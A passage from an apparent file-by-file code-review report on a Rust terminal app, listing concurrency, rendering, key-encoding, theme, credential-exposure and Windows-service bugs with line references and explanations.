stored pid with no identity check, while the sibling agent_reaper.rs in this same repo exists precisely because a bare pid is unsafe: if the agent already died and the pid was reused, this SIGTERMs an unrelated process, and unlike agent_reaper there is no (pid, start_time) pin; ssh_agent.rs:75+92+119 ensure holds the process-global AGENTS mutex across the ssh-agent subprocess spawn AND its output() wait, so every other tabs spawn blocks on it — the module moved ssh-add off the spawn path at :127-133 explicitly because spawn latency matters, then serialises the whole registry behind a process launch; ssh_agent.rs:75+166 both lock sites use .lock().ok() and silently give up on poison, against the codebase convention of unwrap_or_else(PoisonError::into_inner) — one poisoned mutex permanently disables per-tab agents for the rest of the daemons life AND makes teardown a no-op, leaking every subsequent agent; ssh_agent.rs:45-48 when XDG_RUNTIME_DIR is unset the sockets go under the PERSISTENT state dir instead of a tmpfs, so an unclean stop leaves socket files there forever — teardown is the only unlink and it needs the in-memory map, and nothing sweeps the directory at startup; ssh_agent.rs:88-90 the pre-bind unlink has no staleness probe (no connect attempt), which is what turns the collision case above, and any id-reuse case, from a loud bind failure into silent cross-tab credential sharing; ssh_agent.rs:121-123+133-150 the key is ssh-added in a DETACHED thread that races the tabs own shell, so the first git/ssh in a freshly spawned tab can run before the identity is loaded and fail for no visible reason; api/ssh_agent.rs:47 also passes the key through as a fully arbitrary filesystem path with no validation, and ssh_agent.rs:143-145 logs that path plus the ssh-add exit status, which turns the endpoint into a file existence/readability oracle for the service accounts filesystem

### `src/sweep.rs`

10 findings: sweep ignores --read-only (app.rs:1438/headless.rs:1059 spawn unconditionally) so a read-only instance shells out to sources, appends to the shared blackboard and gossips - and read-only is meant to run BESIDE a normal instance; fleet_sweep_gossip:true is a bare bool that bidirectionally gossips with EVERY remote_endpoint (gossip.rs:137-140, exchange pulls+merges their board) with no per-peer opt-in; a panic in once() kills the loop permanently and silently (handle dropped, quiet sweeps log nothing); fleet_sweep_minutes is the only knob not re-read per tick and 0 never stops the thread; first sweep waits a full period so a daemon restarted more often than the period never sweeps; blackboard append failures filed under source_errors; LCOV read with no staleness/mtime check and can be read mid-write; prefs loaded twice per sweep; Preferences::default() cooldown is 0->1d vs serde default 30d; the off-unless-asked test asserts on Preferences::default() then calls spawn_if_configured() which reads the real user config, so on a machine with the sweep enabled cargo test spawns a live sweeping thread

### `src/term_export.rs`

term_export.rs:213-233 and 377-397 the flag->SGR map covers only BOLD/DIM/ITALIC/UNDERLINE/INVERSE/HIDDEN/STRIKEOUT — alacritty CellFlags also carries DOUBLE_UNDERLINE, UNDERCURL, DOTTED_UNDERLINE, DASHED_UNDERLINE (SGR 4:2/4:3/4:4/4:5, emitted by nvim/fish/rustc for error+spell underlines) and none are re-emitted, so that styling is silently DROPPED from every export; worse, those flags still take part in the cell.flags != cur_flags diff (188/351) and are stored into cur_flags (244/407), so line 253/414 then pushes a trailing ESC[0m closing a style that was never opened; term_export.rs:188/244/253 (and 351/407/414) the same bug class for the NON-SGR flags: WRAPLINE / WIDE_CHAR / WIDE_CHAR_SPACER / LEADING_WIDE_CHAR_SPACER live in the same bitset and are compared+stored as if they were attributes, so every soft-wrapped row's last cell and every CJK/emoji cell needlessly enters the SGR branch and every wrap-continued row gets a spurious ESC[0m glued into the MIDDLE of the joined logical line (the test at 572-573 documents the symptom and shrugs); cur_flags should be masked to the SGR-relevant subset once; term_export.rs:274/282 the returned cursor column is a GRID-column count (prefix_cols += cols) while the emitted logical line has SGR escapes inlined and WIDE_CHAR_SPACER cells skipped (178) — for any line containing wide chars each char eats 2 grid cols but 1 emitted char, so the reported col overshoots the joined line and cannot be used for positioning; term_export.rs:159-161 max_lines below the screen height is silently ignored: want.saturating_sub(screen) makes extra=0 and the loop still walks 0..screen, so term_to_ansi_lines(term, Some(3)) on a 24-row grid returns 24 lines — callers pass 200/2000 today so it is latent, and api/output.rs:115 works around it by re-trimming the rendered payload; term_export.rs:172 grid[Column(cols - 1)] underflows if cols==0 (no guard on a degenerate resize); term_export.rs:315-322 the doc claims cursor_dump is None when the cursor sits above the window, but grid.cursor.point.line is always screen-relative (0..screen) and start_row<=0, so the guard is always true and the None branch is unreachable; term_export.rs:331 String::with_capacity(cols*want*2) eagerly allocates ~960 KB per rebuild at want=2000/cols=240 regardless of how empty the scrollback actually is, per tab, on the ~96 ms headless refresh; term_export.rs:299-431 vs 139-291 the two cell walks are ~150 duplicated lines that have ALREADY drifted (push_code(&mut sgr,"0") vs bare sgr.push('0'), closure shape) — equivalent today only by accident, and a fix to one will not reach the other; term_export.rs:279-281 the 'lines is empty while continues_prev' fallback is dead (continues_prev is false on the first row, so lines is never empty there)

### `src/terminal.rs`

terminal.rs:479-487 the same doc-splice defect I just found in api.rs: the block documenting alt_scroll_bytes ('Encode a scroll-wheel gesture … Positive lines => user wants OLDER content => up-arrow') is attached to expand_path_prefix at :487, which it does not describe at all, while alt_scroll_bytes itself at :521 is left with no doc — a botched edit moved a function out from under its comment and nothing catches it; terminal.rs:1458-1470 apply_pending_resize clears the parked resize at :1464 BEFORE the `let Some(cell) = self.cell_size else { return false }` guard at :1465, so when cell_size is not yet measured the pending size is DISCARDED rather than left queued — the tab then keeps painting the stale grid until some later bounds change re-triggers the whole path, and nothing re-parks it; terminal.rs:1468-1469 last_resize_apply is stamped before calling force_resize, but force_resize early-returns at :1483 when last_size already matches — so a no-op apply still restarts the RESIZE_SETTLE window and pushes the NEXT genuine resize onto the 150 ms parking path for no reason; terminal.rs:1214-1217+1236-1238 send_input returns silently when the tab is locked and send_input_bytes returns (), so the API input drain has no way to learn the bytes were dropped: POST /input to a locked tab reports success while the keystrokes are discarded — silent data loss at the lock feature's own chokepoint; terminal.rs:1223-1229 send_input trace-logs the first 16 bytes of EVERY input batch as text (target INPUT_TRACE_TARGET) — that is raw keystrokes and the head of every paste, i.e. passwords, API keys and tokens the user types into the tab, landing in the log ring that /logs serves; the preview is unconditional on content and there is no redaction; terminal.rs:497-505 expand_path_prefix silently mis-handles $VAR: an UNSET variable makes the whole if-let chain fail and falls through to the relative branch returning None, so the caller joins the literal string '$FOO/bar' onto the cwd instead of reporting an unknown variable; a bare '$VAR' with no '/' is never expanded at all even though bare '~' is (:493), and '~user/…' is unhandled — three inconsistent outcomes for one syntax family; terminal.rs:2360-2366 the grid dimensions are computed as `(bounds.size.width / cell.width) as usize` with no guard on cell.width: a zero or denormal cell size yields inf, `as usize` saturates to usize::MAX, `.max(2)` passes it straight through, and :2388 hands usize::MAX columns to Term::resize; terminal.rs:1111-1114+1496-1497+2395-2396 every WindowSize is built with `lines as u16` / `cols as u16` — silent truncation, and pinned_grid is set from the CLI (`resize <tab> --cols N`), so a pin above 65535 wraps to a small number and the PTY is told a size the grid does not have, with no clamp or error; terminal.rs:513-518 vs :521-528 the two wheel encoders disagree on a zero delta: alt_scroll_bytes(0) correctly emits nothing (n = 0), while page_scroll_bytes(0) falls into the else and emits a PageDown — a zero-magnitude wheel event injects a spurious page-down for Claude-Code tabs only; terminal.rs:539-551 the legacy X10 mouse branch silently CLAMPS col/row to 223 rather than suppressing the report or falling back to SGR, so on any terminal wider than 223 columns the app is told the wheel happened at column 223 — a wrong position reported as if it were correct; terminal.rs:70-83+116-130 paint_log::record_present pushes into PRESENTS unconditionally while the flush that drains it only runs from record(), which is skipped whenever prepaint reuses last_prepaint (the try_lock_unfair path at :344-347) — under sustained lock contention PRESENTS grows without bound

### `src/terminal_utils.rs`

terminal_utils.rs:11-23+26 ks.modifiers.platform (Super/Cmd) and .function are NEVER consulted by any arm, so Super+K falls through to 128-140 and returns key_char — a literal 'k' typed into the PTY; terminal.rs:1740-1810 (the only caller) has no platform guard either, so every unhandled Super chord leaks a character to the shell, and xterm_modifier omits it so Super+Up is byte-identical to a bare Up; terminal_utils.rs:128-146 alt is silently DROPPED whenever ctrl is also held on a letter — ctrl+alt+a returns [0x01] with no ESC prefix, so M-C-a (tmux prefix, emacs/readline bindings) is indistinguishable from plain C-a; same at 97-111 and 144-146; terminal_utils.rs:35-43,94-95 guard order drops modifiers across the literal table: 'enter' if shift wins over if alt (alt+shift+enter loses the ESC), 'backspace' if ctrl wins over if alt (ctrl+alt+bs -> 0x08, alt gone), 'tab' ignores ctrl and alt entirely, 'escape' has no alt arm (alt+esc should be ESC ESC), and 'space' has a ctrl arm but no alt arm so alt+space sends a bare 0x20 instead of ESC 0x20 (M-space = readline set-mark) — every test uses a single modifier (ctrl_alt() is exercised only on arrows, 363-369) so none of this is covered; terminal_utils.rs:142 key.len() == 1 is a BYTE length test, so any non-ASCII single-character key label (é, ü, € on the matching layout) is len 2-3 and falls to 161 -> None: with alt held and key_char absent, Alt+é emits nothing at all instead of ESC+é (the 107/143 as_bytes()[0] indexing is only sound because of that same check); terminal_utils.rs:26 the mode argument is consulted ONLY for APP_CURSOR — TermMode::LINE_FEED_NEW_LINE (LNM) is ignored so Enter always sends bare CR even when the app requested CRLF, and APP_KEYPAD is ignored so numpad keys get no SS3 encoding; terminal_utils.rs:175-177 hsla_eq compares hue LINEARLY on a wrapping 0..1 axis so h=0.999 vs h=0.001 (both red, visually identical) compare unequal, and any NaN channel makes every comparison false — used to skip redundant work, so the cost is spurious repaints; terminal_utils.rs:56-61 the shift-modified home/end CSI forms are unreachable from the GUI: terminal.rs:1765-1795 swallows shift+home/end/pageup/pagedown for scrollback before this function runs, so those arms are dead in the only caller yet still asserted by tests as if live

### `src/theme.rs`

theme.rs:134-157 named_to_hsla collapses Dim*/Bright*Foreground onto the plain slot (DimRed->ansi[1]==Red, DimForeground/BrightForeground->term_fg), so SGR 2 dim text renders identical to normal — de-emphasis from git/systemd/ls is silently lost; theme.rs:152+206 NamedColor::Cursor and OSC-12 index 258 answer term_fg, but the cursor is actually painted as a hardcoded Rgba{0.86,0.86,0.86,a:0.7} (terminal.rs:3178) that ignores the theme entirely — under LIGHT (bg 0xffffff) a 0.86 grey at 70% alpha is near-invisible, and an app querying OSC 12 is told the cursor is black; theme.rs:232 the '_ =>' arm makes color_index_to_rgb answer ANY out-of-range OSC 4 index with the foreground colour instead of declining, so a query for index 300 gets a plausible-looking wrong reply; theme.rs:124-129 with_term_bg tints only term_bg, leaving selection/bg/surface at theme values — DARK.selection is 0x094771, so a tab tinted anywhere near that navy makes mouse selection invisible (no contrast check between tint and selection anywhere); theme.rs:339+341 in the DEFAULT theme TOMORROW_NIGHT_BLUE elevated==bg==0x002451, so popovers/menus have zero elevation contrast and rely entirely on border; theme.rs:346-347 TNB accent 0xbbdaff (pale) vs accent_hover 0x003f8e (dark navy) inverts lightness on hover while the label colour stays fixed (app.rs:4973-4974), and app.rs:4822 pairs sel_bg=accent(pale) with dialog_fg=white -> white-on-pale-blue switcher selection in the default theme; theme.rs:384 LIGHT.danger 0xf5c6cb (pale pink) is the tab attention blink bg (app.rs:3273) over surface 0xf3f3f3 — the bell/attention signal is effectively invisible in the Light theme, whereas dark themes use 0x5c1010; theme.rs:17+61 Serialize/Deserialize are derived on ThemeName/CursorStyle but never used (prefs round-trip through id()/from_id at app.rs:887-891) — a future serde use would write 'TomorrowNightBlue' where the rest of the codebase expects 'tomorrow-night-blue'; theme.rs:395-435 vs 437-627 tests_palette and tests duplicate all_themes_have_labels/ansi_16_colors_populated/from_id_roundtrip verbatim, both compiled in gui builds

### `src/tracking.rs`

tracking.rs:183-185 the Wakatime API key is passed to the child as a COMMAND-LINE ARGUMENT (--key <k>), so it sits in /proc/<pid>/cmdline and is readable by every local user and by every agent tab in this very app that runs ps, for the lifetime of each heartbeat subprocess; the safe path already exists and is documented five lines away at 60-61 (wakatime-cli reads api_key from ~/.wakatime.cfg itself), so this leak buys nothing; tracking.rs:79 'now - last_sent' is an UNSIGNED subtraction with no guard: unix_now() returns 0 on a pre-epoch clock (116 unwrap_or_default) and any backward clock step (NTP correction, suspend/resume) makes now < last_sent, which panics in debug and wraps to a huge value in release — the wrap turns the debounce off and spawns a subprocess per ~2 s activity event until the clock catches up, and the panic silently kills the worker thread since it runs detached (67) and record_activity discards the send error (105); saturating_sub is what is wanted, and the test at 294-302 reproduces the same unguarded subtraction so it cannot catch it; tracking.rs:72 'while let Ok(HeartbeatEvent::Activity { cwd }) = rx.recv()' terminates the worker by PATTERN-MATCH FAILURE rather than by handling Shutdown — it works today only because Activity is the sole other variant, and because while-let needs no exhaustiveness the compiler will not say a word when a third variant is added: the tracker will just silently stop on the first one received; tracking.rs:187-189 cmd.output() blocks the worker thread on the child with NO timeout, and wakatime-cli makes a network call — a hang (captive portal, dead DNS) parks the thread forever while the UNBOUNDED mpsc channel keeps accepting every record_activity, so memory grows without limit and no heartbeat is ever sent again for the process lifetime, with no recovery path; tracking.rs:74-89 the comment claims the debounce keeps detect_project's ancestor .git walk off the hot path, but line 80 only skips when the cwd is UNCHANGED — in the multi-tab case that is this product's whole point, consecutive activity events alternate between tabs in different cwds, so cwd != last_cwd holds and the full stat-per-ancestor walk runs on EVERY event; tracking.rs:91-97 last_sent/last_project/last_cwd are committed BEFORE send_heartbeat runs, so a failed heartbeat is recorded as if it succeeded and nothing retries for another 120 s; wakatime-cli's own offline queue covers a network failure but NOT a spawn failure, which is exactly the case the next finding produces; tracking.rs:137-144 the PATH scan accepts any candidate that is_file() without checking the executable bit, and returning it short-circuits the ~/.wakatime fallback permanently — a non-executable wakatime-cli on PATH means every heartbeat fails to spawn and warn!s forever while a perfectly good binary sits unused in ~/.wakatime; tracking.rs:148-162 the ~/.wakatime fallback takes the FIRST read_dir hit, and read_dir order is arbitrary — with a leftover .bak, a partial download, or a wakatime-cli-darwin-arm64 copied from another machine alongside the real one, the selection is nondeterministic across runs; there is no os/arch match, and the comment at 154-155 ('there is only one valid binary per host') states the assumption instead of checking it; tracking.rs:108-110 shutdown() sends and returns without joining the worker, and there is no Drop impl, so nothing waits for an in-flight heartbeat and nothing sends Shutdown automatically — the final work interval before exit is simply lost

### `src/transcript_compact.rs`

transcript_compact.rs:566-570 validate() pushes 'unparsable line survived' for every record parse() deliberately kept — parse's own contract at :36 and :120 is that unparsable lines are 'kept verbatim, never dropped', so a transcript containing one malformed line makes validate non-empty forever and its documented meaning ('Empty => --resume integrity preserved') reports a compaction fault that the compactor did not cause; that push is also outside the `problems.len() >= 3` cap at :577, so a corrupt file yields an unbounded problems Vec; transcript_compact.rs:157-172 cap_string INFLATES for small caps and reports zero: with cap=16 on a 20-byte value, head+tail is 16 bytes plus the ~28-byte '...[trimmed N bytes]...' marker, so `new` is ~44 bytes, `removed` saturating_subs to 0, and apply :326-331 still swaps the longer string in — tool_cap is a pub field, so any cap below ~40 grows the transcript while stats claim a saving of 0; transcript_compact.rs:321-334 the cap layer replaces `tool_result.content` with `Value::String(serialized_json)` regardless of its original shape — an array content block (the common `[{\"type\":\"text\",...}]` form) is coerced to a string of escaped JSON, and the operation is NOT idempotent: a second apply() over the output re-serializes that string (now with escapes) and can cap it again, nesting a second '[trimmed N bytes]' marker inside the first; transcript_compact.rs:295-339 the block edit does `mem::take(blocks)` and then re-resolves `v.pointer_mut(\"/message/content\")` to write `nb` back — if that second lookup ever fails the taken array is dropped and the record is left with an EMPTY content array, i.e. the entire turn's content silently vanishes; the `if let` reads as defensive but is a data-loss trapdoor with no else branch; transcript_compact.rs:343 `rec.raw = to_string(&v).unwrap_or_else(|_| rec.raw.clone())` desyncs the two representations on failure: rec.value holds the EDITED value while rec.raw holds the ORIGINAL text, so validate() (which reads .value) passes while whatever writes the file from .raw emits uncompacted bytes, and the stats already counted the saving — the record's two views disagree with no signal; transcript_compact.rs:343 also silently reorders keys: serde_json is pulled without `preserve_order` (Cargo.toml:133), so Value::Object is a BTreeMap and every `changed` record is rewritten alphabetically while untouched records keep their original ordering — the output file is a mix of two serializations, which defeats byte-diffing a compaction against its input; transcript_compact.rs:185-198 parent_of is a plain insert keyed by uuid, so a transcript with duplicate uuids (branch/rewind, which the tree format permits) keeps only the LAST record's parent — resolve() at :220-230 then splices a dropped attachment's children onto the wrong ancestor, and validate cannot see it because the resulting parentUuid still exists; transcript_compact.rs:123-124 parse filters only `!l.is_empty()`, so a whitespace-only line becomes an unparsable Record (feeding the validate false-positive above), and size() at :135 assumes exactly one '\\n' per line while str::lines strips '\\r\\n' — a CRLF transcript is under-measured by one byte per line, biasing every reported saving; transcript_compact.rs:496 measure_batch allocates a fresh `vec![0; caps.len()]` for EVERY record inside the loop whose stated purpose (:440-445) is to be the fast single-pass scan — one malloc per transcript line, on the path that runs 10 configs x 54 files

### `src/win_service.rs`

lib.rs:72-73 gates 'pub mod win_service' on all(windows, not(feature="gui")) but bin/tab-atelier-headless.rs:83-84 calls try_run_as_service() under bare #[cfg(windows)] — building the headless binary on Windows WITH the gui feature fails to compile against a module that does not exist; invisible from Linux because both cfgs are off, and CLAUDE.md asks for BOTH feature configs to be checked; win_service.rs:78+84 'let _ = crate::headless::run()' discards the daemon's error and the Stopped report hard-codes ServiceExitCode::Win32(0), so a daemon that dies of a FATAL error reports a perfectly clean stop: the SCM's configured failure/recovery actions (restart-on-crash, the whole reason to run as a service) never fire and the Event Log shows a normal shutdown — the error must map to a non-zero Win32/ServiceSpecific code; win_service.rs:42+45-49 try_run_as_service() returns true whenever the DISPATCHER succeeded, independent of whether run_service() did anything at all — service_main swallows the Result, so a failing register() (63) or a failing first set_service_status() (65) returns immediately, the dispatcher returns Ok, try_run_as_service reports true and bin:84 returns exit 0: a service that silently did NOTHING is indistinguishable from a clean run; win_service.rs:39-42 .is_ok() conflates 'not launched by the SCM' (ERROR_FAILED_SERVICE_CONTROLLER_CONNECT — the only case the comment describes) with every OTHER dispatcher failure (ERROR_INVALID_DATA, ERROR_SERVICE_ALREADY_RUNNING); any of those silently falls through to the console path, which under the SCM means never reporting Running, being killed on timeout, and losing the real cause; win_service.rs:68 controls_accepted omits ServiceControlAccept::PRESHUTDOWN — with SHUTDOWN alone the service only gets the short system-shutdown window, yet the whole point of the Stop path is to flush state (headless.rs:1165 persist), so a system shutdown can cut the flush short; PRESHUTDOWN is the control designed for exactly that; win_service.rs:52-61 the Stop handler flips SHUTDOWN_REQUESTED and returns NoError without ever reporting StopPending + a wait_hint, so the SCM keeps seeing Running for the entire wind-down and has no signal a stop is in progress (the flag itself is polled fast — headless.rs:1165 on a 250 ms idle tick — so the real exposure is the duration of persist()); win_service.rs:63-73 the ? on register/set_service_status returns before ANY status is reported, leaving the service stuck in the SCM's start-pending state until it times out; a panic inside headless::run() unwinds past the Stopped report at 80 the same way; win_service.rs:71/86 wait_hint: Duration::default() is meaningless on non-pending states — harmless in itself, but it is the tell for the pending-state reports that are missing above

